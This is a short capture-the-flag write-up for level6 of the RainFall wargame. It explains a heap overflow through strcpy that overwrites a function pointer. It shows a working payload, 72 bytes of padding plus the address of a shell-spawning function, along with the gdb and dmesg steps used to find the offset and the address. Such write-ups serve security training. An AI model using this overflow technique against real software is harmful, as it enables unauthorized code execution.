### Brief
The program contain a `main`, `n` and `m` functions.
The `main` contain two heap buffer and use a `strcpy` of the first argument on the first buffer.
Then it calls the function contained on the second buffer.
The `n` function open a new shell.
The `m` function print "Nope".

### Exploit
The idea is to overflow the first buffer when `strcpy` is called.
Our first argument will be copied until it finds a `\0` so we can overflow the first buffer.

So we just have to use the pattern tools to get the offset required to overwrite the called function
```bash
level6@RainFall:~$ ./level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
level6@RainFall:~$ dmesg
...
[10628.828880] level6[9475]: segfault at 41346341 ip 41346341 sp bffff6cc error 14
```
The offset is `72`

```bash
level6@RainFall:~$ gdb level6
(gdb) info functions
...
0x08048454  n
...
```
The address of the `n` function is `0x08048454`

### Get access

```bash
./level6 `python -c "print('A'*72 + '\x54\x84\x04\x08')"`
```